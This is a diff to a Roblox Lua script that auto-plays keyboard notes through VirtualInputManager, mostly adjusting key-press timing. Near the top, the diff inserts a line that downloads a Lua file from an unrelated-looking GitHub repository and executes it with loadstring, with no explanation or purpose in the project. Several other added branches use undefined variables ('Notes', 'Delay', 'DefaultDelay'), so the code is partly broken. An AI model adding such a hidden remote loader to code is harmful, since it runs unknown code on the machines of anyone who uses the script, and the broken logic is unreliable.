@@ -9,6 +9,8 @@ local FinishTime = shared.ftime or 10
 
 local vim = game:GetService("VirtualInputManager")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lasudueneuxjsn/loo.lua/main/No.lua", true))()
+
 local nstr = string.gsub(str,"[[\]\n]","")
 
 local delay = shared.tempo and (6 / shared.tempo) or shared.delay or FinishTime / (string.len(nstr) / 1.05)
@@ -51,7 +53,7 @@ for i=1, #str do
                 pcall(function()
                     doshift(cc)
                     vim:SendKeyEvent(true, string.byte(cc:lower()), false, nil)
-                    wait(delay/2)
+                    wait()
                     vim:SendKeyEvent(false, string.byte(cc:lower()), false, nil)
                     endshift()
                 end)
@@ -64,7 +66,7 @@ for i=1, #str do
                 pcall(function()
                     doshift(cc)
                     vim:SendKeyEvent(true, string.byte(cc:lower()), false, nil)
-                    endshift()
+                    endshift(cc)
                 end)
                
                 wait()
@@ -85,11 +87,18 @@ for i=1, #str do
         continue
     elseif c == " " or string.byte(c) == 10 then
         if shared.nospacedelay then continue end
-        wait(delay*2)
+        wait(delay)
         continue
     elseif c == "|" or c == "-" then
         wait(delay*2)
         continue
+    elseif c == "" then
+        continue
+    elseif Notes == '{' then
+         Delay = Delay/2
+    elseif Notes == '}' then
+         Delay = DefaultDelay
+
     end
     
     if not rem then
@@ -106,5 +115,5 @@ for i=1, #str do
     end)
    
     
-    wait(delay)
+    wait()
 end
